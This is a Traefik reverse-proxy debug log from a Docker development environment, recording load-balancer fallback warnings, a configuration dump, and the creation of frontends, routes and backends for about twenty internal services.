time="2018-05-02t12:59:23+02:00" level=debug msg="originlabelsmap[com.docker.compose.oneoff:false com.docker.compose.project:extsystems com.docker.compose.service:database com.docker.compose.version:1.18.0 maintainer:perry skountrianos com.docker.compose.config-hash:57498355414cc7b54e9cc4a83a488706e87cf0aae0d53490266f0e570bb6ab86 com.docker.compose.container-number:1]"
time="2018-05-02t12:59:23+02:00" level=debug msg="alllabelsmap[:map[]]"
time="2018-05-02t12:59:23+02:00" level=debug msg="validation of load balancer method for backend backend-web-devmyenterprise failed: invalid load-balancing method \'\'
using default method wrr."
time="2018-05-02t12:59:23+02:00" level=debug msg="validation of load balancer method for backend backend-mongo-devmyenterprise failed: invalid load-balancing method \'\'
using default method wrr."
time="2018-05-02t12:59:23+02:00" level=debug msg="validation of load balancer method for backend backend-products-devmyenterprise failed: invalid load-balancing method \'\'
using default method wrr."
time="2018-05-02t12:59:23+02:00" level=debug msg="validation of load balancer method for backend backend-healthcheck-devmyenterprise failed: invalid load-balancing method \'\'
using default method wrr."
time="2018-05-02t12:59:23+02:00" level=debug msg="validation of load balancer method for backend backend-notifications-devmyenterprise failed: invalid load-balancing method \'\'
using default method wrr."
time="2018-05-02t12:59:23+02:00" level=debug msg="validation of load balancer method for backend backend-interfacemock-extsystems failed: invalid load-balancing method \'\'
using default method wrr."
time="2018-05-02t12:59:23+02:00" level=debug msg="validation of load balancer method for backend backend-traefik-traefik failed: invalid load-balancing method \'\'
using default method wrr."
time="2018-05-02t12:59:23+02:00" level=debug msg="validation of load balancer method for backend backend-identityserver-extsystems failed: invalid load-balancing method \'\'
using default method wrr."
time="2018-05-02t12:59:23+02:00" level=debug msg="validation of load balancer method for backend backend-timerbeeblocked failed: invalid load-balancing method \'\'
using default method wrr."
time="2018-05-02t12:59:23+02:00" level=debug msg="validation of load balancer method for backend backend-asmp-devmyenterprise failed: invalid load-balancing method \'\'
using default method wrr."
time="2018-05-02t12:59:23+02:00" level=debug msg="validation of load balancer method for backend backend-internweb-devmyenterprise failed: invalid load-balancing method \'\'
using default method wrr."
time="2018-05-02t12:59:23+02:00" level=debug msg="validation of load balancer method for backend backend-tickets-devmyenterprise failed: invalid load-balancing method \'\'
using default method wrr."
time="2018-05-02t12:59:23+02:00" level=debug msg="validation of load balancer method for backend backend-saratiba failed: invalid load-balancing method \'\'
using default method wrr."
time="2018-05-02t12:59:23+02:00" level=debug msg="validation of load balancer method for backend backend-ordermanagement-devmyenterprise failed: invalid load-balancing method \'\'
using default method wrr."
time="2018-05-02t12:59:23+02:00" level=debug msg="validation of load balancer method for backend backend-timerbee failed: invalid load-balancing method \'\'
using default method wrr."
time="2018-05-02t12:59:23+02:00" level=debug msg="validation of load balancer method for backend backend-news-devmyenterprise failed: invalid load-balancing method \'\'
using default method wrr."
time="2018-05-02t12:59:23+02:00" level=debug msg="validation of load balancer method for backend backend-logservice-devmyenterprise failed: invalid load-balancing method \'\'
using default method wrr."
time="2018-05-02t12:59:23+02:00" level=debug msg="validation of load balancer method for backend backend-mirth-mirthconnect failed: invalid load-balancing method \'\'
using default method wrr."
time="2018-05-02t12:59:23+02:00" level=debug msg="validation of load balancer method for backend backend-saratibacs failed: invalid load-balancing method \'\'
using default method wrr."
time="2018-05-02t12:59:23+02:00" level=debug msg="validation of load balancer method for backend backend-database-extsystems failed: invalid load-balancing method \'\'
using default method wrr."
time="2018-05-02t12:59:23+02:00" level=debug msg="configuration received from provider docker: {\\"backends\\":{\\"backend-asmp-devmyenterprise\\":{\\"servers\\":{\\"server-devmyenterprise-asmp-1\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-database-extsystems\\":{\\"servers\\":{\\"server-extsystems-database-1\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-healthcheck-devmyenterprise\\":{\\"servers\\":{\\"server-devmyenterprise-healthcheck-1\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-identityserver-extsystems\\":{\\"servers\\":{\\"server-extsystems-identityserver-1\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-interfacemock-extsystems\\":{\\"servers\\":{\\"server-extsystems-interfacemock-1\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-internweb-devmyenterprise\\":{\\"servers\\":{\\"server-devmyenterprise-internweb-1\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-logservice-devmyenterprise\\":{\\"servers\\":{\\"server-devmyenterprise-logservice-1\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-mirth-mirthconnect\\":{\\"servers\\":{\\"server-mirthconnect-mirth-1\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-mongo-devmyenterprise\\":{\\"servers\\":{\\"server-devmyenterprise-mongo-1\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-news-devmyenterprise\\":{\\"servers\\":{\\"server-devmyenterprise-news-1\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-notifications-devmyenterprise\\":{\\"servers\\":{\\"server-devmyenterprise-notifications-1\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-ordermanagement-devmyenterprise\\":{\\"servers\\":{\\"server-devmyenterprise-ordermanagement-1\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-products-devmyenterprise\\":{\\"servers\\":{\\"server-devmyenterprise-products-1\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-saratiba\\":{\\"servers\\":{\\"server-saratiba-app-1\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-saratibacs\\":{\\"servers\\":{\\"server-saratiba-cs-1\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-tickets-devmyenterprise\\":{\\"servers\\":{\\"server-devmyenterprise-tickets-1\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-timerbee\\":{\\"servers\\":{\\"server-saratiba-timerbee-1\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-timerbeeblocked\\":{\\"servers\\":{\\"server-saratiba-timerbeeblocked-1\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-traefik-traefik\\":{\\"servers\\":{\\"server-traefik-traefik-1\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-web-devmyenterprise\\":{\\"servers\\":{\\"server-devmyenterprise-web-1\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}}},\\"frontends\\":{\\"frontend-host-app-saratiba-dockerdev-world-direct-at-5\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-saratiba\\",\\"routes\\":{\\"route-frontend-host-app-saratiba-dockerdev-world-direct-at-5\\":{\\"rule\\":\\"host:app.saratiba.dockerdev.world-direct.at\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":[]},\\"frontend-host-asmp-devmyenterprise-dockerdev-world-direct-at-14\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-asmp-devmyenterprise\\",\\"routes\\":{\\"route-frontend-host-asmp-devmyenterprise-dockerdev-world-direct-at-14\\":{\\"rule\\":\\"host:asmp.devmyenterprise.dockerdev.world-direct.at\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":[]},\\"frontend-host-cs-saratiba-dockerdev-world-direct-at-6\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-saratibacs\\",\\"routes\\":{\\"route-frontend-host-cs-saratiba-dockerdev-world-direct-at-6\\":{\\"rule\\":\\"host:cs.saratiba.dockerdev.world-direct.at\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":[]},\\"frontend-host-database-extsystems-dockerdev-world-direct-at-19\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-database-extsystems\\",\\"routes\\":{\\"route-frontend-host-database-extsystems-dockerdev-world-direct-at-19\\":{\\"rule\\":\\"host:database.extsystems.dockerdev.world-direct.at\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":[]},\\"frontend-host-healthcheck-devmyenterprise-dockerdev-world-direct-at-9\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-healthcheck-devmyenterprise\\",\\"routes\\":{\\"route-frontend-host-healthcheck-devmyenterprise-dockerdev-world-direct-at-9\\":{\\"rule\\":\\"host:healthcheck.devmyenterprise.dockerdev.world-direct.at\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":[]},\\"frontend-host-identityserver-extsystems-dockerdev-world-direct-at-7\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-identityserver-extsystems\\",\\"routes\\":{\\"route-frontend-host-identityserver-extsystems-dockerdev-world-direct-at-7\\":{\\"rule\\":\\"host:identityserver.extsystems.dockerdev.world-direct.at\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":[]},\\"frontend-host-interfacemock-extsystems-dockerdev-world-direct-at-11\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-interfacemock-extsystems\\",\\"routes\\":{\\"route-frontend-host-interfacemock-extsystems-dockerdev-world-direct-at-11\\":{\\"rule\\":\\"host:interfacemock.extsystems.dockerdev.world-direct.at\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":[]},\\"frontend-host-internweb-devmyenterprise-dockerdev-world-direct-at-2\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-internweb-devmyenterprise\\",\\"routes\\":{\\"route-frontend-host-internweb-devmyenterprise-dockerdev-world-direct-at-2\\":{\\"rule\\":\\"host:internweb.devmyenterprise.dockerdev.world-direct.at\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":[]},\\"frontend-host-logservice-devmyenterprise-dockerdev-world-direct-at-15\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-logservice-devmyenterprise\\",\\"routes\\":{\\"route-frontend-host-logservice-devmyenterprise-dockerdev-world-direct-at-15\\":{\\"rule\\":\\"host:logservice.devmyenterprise.dockerdev.world-direct.at\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":[]},\\"frontend-host-mirth-mirthconnect-dockerdev-world-direct-at-18\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-mirth-mirthconnect\\",\\"routes\\":{\\"route-frontend-host-mirth-mirthconnect-dockerdev-world-direct-at-18\\":{\\"rule\\":\\"host:mirth.mirthconnect.dockerdev.world-direct.at\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":[]},\\"frontend-host-mongo-devmyenterprise-dockerdev-world-direct-at-17\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-mongo-devmyenterprise\\",\\"routes\\":{\\"route-frontend-host-mongo-devmyenterprise-dockerdev-world-direct-at-17\\":{\\"rule\\":\\"host:mongo.devmyenterprise.dockerdev.world-direct.at\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":[]},\\"frontend-host-news-devmyenterprise-dockerdev-world-direct-at-4\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-news-devmyenterprise\\",\\"routes\\":{\\"route-frontend-host-news-devmyenterprise-dockerdev-world-direct-at-4\\":{\\"rule\\":\\"host:news.devmyenterprise.dockerdev.world-direct.at\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":[]},\\"frontend-host-notifications-devmyenterprise-dockerdev-world-direct-at-12\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-notifications-devmyenterprise\\",\\"routes\\":{\\"route-frontend-host-notifications-devmyenterprise-dockerdev-world-direct-at-12\\":{\\"rule\\":\\"host:notifications.devmyenterprise.dockerdev.world-direct.at\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":[]},\\"frontend-host-ordermanagement-devmyenterprise-dockerdev-world-direct-at-13\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-ordermanagement-devmyenterprise\\",\\"routes\\":{\\"route-frontend-host-ordermanagement-devmyenterprise-dockerdev-world-direct-at-13\\":{\\"rule\\":\\"host:ordermanagement.devmyenterprise.dockerdev.world-direct.at\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":[]},\\"frontend-host-products-devmyenterprise-dockerdev-world-direct-at-3\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-products-devmyenterprise\\",\\"routes\\":{\\"route-frontend-host-products-devmyenterprise-dockerdev-world-direct-at-3\\":{\\"rule\\":\\"host:products.devmyenterprise.dockerdev.world-direct.at\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":[]},\\"frontend-host-tickets-devmyenterprise-dockerdev-world-direct-at-16\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-tickets-devmyenterprise\\",\\"routes\\":{\\"route-frontend-host-tickets-devmyenterprise-dockerdev-world-direct-at-16\\":{\\"rule\\":\\"host:tickets.devmyenterprise.dockerdev.world-direct.at\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":[]},\\"frontend-host-timerbee-saratiba-dockerdev-world-direct-at-8\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-timerbee\\",\\"routes\\":{\\"route-frontend-host-timerbee-saratiba-dockerdev-world-direct-at-8\\":{\\"rule\\":\\"host:timerbee.saratiba.dockerdev.world-direct.at\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":[]},\\"frontend-host-timerbeeblocked-saratiba-dockerdev-world-direct-at-10\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-timerbeeblocked\\",\\"routes\\":{\\"route-frontend-host-timerbeeblocked-saratiba-dockerdev-world-direct-at-10\\":{\\"rule\\":\\"host:timerbeeblocked.saratiba.dockerdev.world-direct.at\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":[]},\\"frontend-host-traefik-traefik-dockerdev-world-direct-at-0\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-traefik-traefik\\",\\"routes\\":{\\"route-frontend-host-traefik-traefik-dockerdev-world-direct-at-0\\":{\\"rule\\":\\"host:traefik.traefik.dockerdev.world-direct.at\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":[]},\\"frontend-host-web-devmyenterprise-dockerdev-world-direct-at-1\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-web-devmyenterprise\\",\\"routes\\":{\\"route-frontend-host-web-devmyenterprise-dockerdev-world-direct-at-1\\":{\\"rule\\":\\"host:web.devmyenterprise.dockerdev.world-direct.at\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":[]}}}"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating frontend frontend-host-app-saratiba-dockerdev-world-direct-at-5"
time="2018-05-02t12:59:23+02:00" level=debug msg="wiring frontend frontend-host-app-saratiba-dockerdev-world-direct-at-5 to entrypoint http"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating route route-frontend-host-app-saratiba-dockerdev-world-direct-at-5 host:app.saratiba.dockerdev.world-direct.at"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating backend backend-saratiba"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating load-balancer wrr"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating server server-saratiba-app-1 at with weight 1"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating frontend frontend-host-asmp-devmyenterprise-dockerdev-world-direct-at-14"
time="2018-05-02t12:59:23+02:00" level=debug msg="wiring frontend frontend-host-asmp-devmyenterprise-dockerdev-world-direct-at-14 to entrypoint http"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating route route-frontend-host-asmp-devmyenterprise-dockerdev-world-direct-at-14 host:asmp.devmyenterprise.dockerdev.world-direct.at"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating backend backend-asmp-devmyenterprise"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating load-balancer wrr"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating server server-devmyenterprise-asmp-1 at with weight 1"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating frontend frontend-host-cs-saratiba-dockerdev-world-direct-at-6"
time="2018-05-02t12:59:23+02:00" level=debug msg="wiring frontend frontend-host-cs-saratiba-dockerdev-world-direct-at-6 to entrypoint http"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating route route-frontend-host-cs-saratiba-dockerdev-world-direct-at-6 host:cs.saratiba.dockerdev.world-direct.at"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating backend backend-saratibacs"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating load-balancer wrr"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating server server-saratiba-cs-1 at with weight 1"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating frontend frontend-host-database-extsystems-dockerdev-world-direct-at-19"
time="2018-05-02t12:59:23+02:00" level=debug msg="wiring frontend frontend-host-database-extsystems-dockerdev-world-direct-at-19 to entrypoint http"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating route route-frontend-host-database-extsystems-dockerdev-world-direct-at-19 host:database.extsystems.dockerdev.world-direct.at"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating backend backend-database-extsystems"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating load-balancer wrr"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating server server-extsystems-database-1 at with weight 1"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating frontend frontend-host-healthcheck-devmyenterprise-dockerdev-world-direct-at-9"
time="2018-05-02t12:59:23+02:00" level=debug msg="wiring frontend frontend-host-healthcheck-devmyenterprise-dockerdev-world-direct-at-9 to entrypoint http"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating route route-frontend-host-healthcheck-devmyenterprise-dockerdev-world-direct-at-9 host:healthcheck.devmyenterprise.dockerdev.world-direct.at"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating backend backend-healthcheck-devmyenterprise"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating load-balancer wrr"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating server server-devmyenterprise-healthcheck-1 at with weight 1"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating frontend frontend-host-identityserver-extsystems-dockerdev-world-direct-at-7"
time="2018-05-02t12:59:23+02:00" level=debug msg="wiring frontend frontend-host-identityserver-extsystems-dockerdev-world-direct-at-7 to entrypoint http"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating route route-frontend-host-identityserver-extsystems-dockerdev-world-direct-at-7 host:identityserver.extsystems.dockerdev.world-direct.at"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating backend backend-identityserver-extsystems"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating load-balancer wrr"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating server server-extsystems-identityserver-1 at with weight 1"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating frontend frontend-host-interfacemock-extsystems-dockerdev-world-direct-at-11"
time="2018-05-02t12:59:23+02:00" level=debug msg="wiring frontend frontend-host-interfacemock-extsystems-dockerdev-world-direct-at-11 to entrypoint http"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating route route-frontend-host-interfacemock-extsystems-dockerdev-world-direct-at-11 host:interfacemock.extsystems.dockerdev.world-direct.at"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating backend backend-interfacemock-extsystems"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating load-balancer wrr"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating server server-extsystems-interfacemock-1 at with weight 1"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating frontend frontend-host-internweb-devmyenterprise-dockerdev-world-direct-at-2"
time="2018-05-02t12:59:23+02:00" level=debug msg="wiring frontend frontend-host-internweb-devmyenterprise-dockerdev-world-direct-at-2 to entrypoint http"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating route route-frontend-host-internweb-devmyenterprise-dockerdev-world-direct-at-2 host:internweb.devmyenterprise.dockerdev.world-direct.at"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating backend backend-internweb-devmyenterprise"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating load-balancer wrr"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating server server-devmyenterprise-internweb-1 at with weight 1"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating frontend frontend-host-logservice-devmyenterprise-dockerdev-world-direct-at-15"
time="2018-05-02t12:59:23+02:00" level=debug msg="wiring frontend frontend-host-logservice-devmyenterprise-dockerdev-world-direct-at-15 to entrypoint http"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating route route-frontend-host-logservice-devmyenterprise-dockerdev-world-direct-at-15 host:logservice.devmyenterprise.dockerdev.world-direct.at"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating backend backend-logservice-devmyenterprise"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating load-balancer wrr"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating server server-devmyenterprise-logservice-1 at with weight 1"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating frontend frontend-host-mirth-mirthconnect-dockerdev-world-direct-at-18"
time="2018-05-02t12:59:23+02:00" level=debug msg="wiring frontend frontend-host-mirth-mirthconnect-dockerdev-world-direct-at-18 to entrypoint http"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating route route-frontend-host-mirth-mirthconnect-dockerdev-world-direct-at-18 host:mirth.mirthconnect.dockerdev.world-direct.at"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating backend backend-mirth-mirthconnect"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating load-balancer wrr"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating server server-mirthconnect-mirth-1 at with weight 1"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating frontend frontend-host-mongo-devmyenterprise-dockerdev-world-direct-at-17"
time="2018-05-02t12:59:23+02:00" level=debug msg="wiring frontend frontend-host-mongo-devmyenterprise-dockerdev-world-direct-at-17 to entrypoint http"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating route route-frontend-host-mongo-devmyenterprise-dockerdev-world-direct-at-17 host:mongo.devmyenterprise.dockerdev.world-direct.at"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating backend backend-mongo-devmyenterprise"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating load-balancer wrr"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating server server-devmyenterprise-mongo-1 at with weight 1"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating frontend frontend-host-news-devmyenterprise-dockerdev-world-direct-at-4"
time="2018-05-02t12:59:23+02:00" level=debug msg="wiring frontend frontend-host-news-devmyenterprise-dockerdev-world-direct-at-4 to entrypoint http"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating route route-frontend-host-news-devmyenterprise-dockerdev-world-direct-at-4 host:news.devmyenterprise.dockerdev.world-direct.at"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating backend backend-news-devmyenterprise"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating load-balancer wrr"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating server server-devmyenterprise-news-1 at with weight 1"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating frontend frontend-host-notifications-devmyenterprise-dockerdev-world-direct-at-12"
time="2018-05-02t12:59:23+02:00" level=debug msg="wiring frontend frontend-host-notifications-devmyenterprise-dockerdev-world-direct-at-12 to entrypoint http"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating route route-frontend-host-notifications-devmyenterprise-dockerdev-world-direct-at-12 host:notifications.devmyenterprise.dockerdev.world-direct.at"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating backend backend-notifications-devmyenterprise"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating load-balancer wrr"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating server server-devmyenterprise-notifications-1 at with weight 1"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating frontend frontend-host-ordermanagement-devmyenterprise-dockerdev-world-direct-at-13"
time="2018-05-02t12:59:23+02:00" level=debug msg="wiring frontend frontend-host-ordermanagement-devmyenterprise-dockerdev-world-direct-at-13 to entrypoint http"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating route route-frontend-host-ordermanagement-devmyenterprise-dockerdev-world-direct-at-13 host:ordermanagement.devmyenterprise.dockerdev.world-direct.at"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating backend backend-ordermanagement-devmyenterprise"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating load-balancer wrr"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating server server-devmyenterprise-ordermanagement-1 at with weight 1"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating frontend frontend-host-products-devmyenterprise-dockerdev-world-direct-at-3"
time="2018-05-02t12:59:23+02:00" level=debug msg="wiring frontend frontend-host-products-devmyenterprise-dockerdev-world-direct-at-3 to entrypoint http"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating route route-frontend-host-products-devmyenterprise-dockerdev-world-direct-at-3 host:products.devmyenterprise.dockerdev.world-direct.at"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating backend backend-products-devmyenterprise"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating load-balancer wrr"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating server server-devmyenterprise-products-1 at with weight 1"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating frontend frontend-host-tickets-devmyenterprise-dockerdev-world-direct-at-16"
time="2018-05-02t12:59:23+02:00" level=debug msg="wiring frontend frontend-host-tickets-devmyenterprise-dockerdev-world-direct-at-16 to entrypoint http"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating route route-frontend-host-tickets-devmyenterprise-dockerdev-world-direct-at-16 host:tickets.devmyenterprise.dockerdev.world-direct.at"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating backend backend-tickets-devmyenterprise"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating load-balancer wrr"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating server server-devmyenterprise-tickets-1 at with weight 1"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating frontend frontend-host-timerbee-saratiba-dockerdev-world-direct-at-8"
time="2018-05-02t12:59:23+02:00" level=debug msg="wiring frontend frontend-host-timerbee-saratiba-dockerdev-world-direct-at-8 to entrypoint http"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating route route-frontend-host-timerbee-saratiba-dockerdev-world-direct-at-8 host:timerbee.saratiba.dockerdev.world-direct.at"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating backend backend-timerbee"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating load-balancer wrr"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating server server-saratiba-timerbee-1 at with weight 1"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating frontend frontend-host-timerbeeblocked-saratiba-dockerdev-world-direct-at-10"
time="2018-05-02t12:59:23+02:00" level=debug msg="wiring frontend frontend-host-timerbeeblocked-saratiba-dockerdev-world-direct-at-10 to entrypoint http"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating route route-frontend-host-timerbeeblocked-saratiba-dockerdev-world-direct-at-10 host:timerbeeblocked.saratiba.dockerdev.world-direct.at"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating backend backend-timerbeeblocked"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating load-balancer wrr"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating server server-saratiba-timerbeeblocked-1 at with weight 1"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating frontend frontend-host-traefik-traefik-dockerdev-world-direct-at-0"
time="2018-05-02t12:59:23+02:00" level=debug msg="wiring frontend frontend-host-traefik-traefik-dockerdev-world-direct-at-0 to entrypoint http"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating route route-frontend-host-traefik-traefik-dockerdev-world-direct-at-0 host:traefik.traefik.dockerdev.world-direct.at"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating backend backend-traefik-traefik"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating load-balancer wrr"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating server server-traefik-traefik-1 at with weight 1"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating frontend frontend-host-web-devmyenterprise-dockerdev-world-direct-at-1"
time="2018-05-02t12:59:23+02:00" level=debug msg="wiring frontend frontend-host-web-devmyenterprise-dockerdev-world-direct-at-1 to entrypoint http"
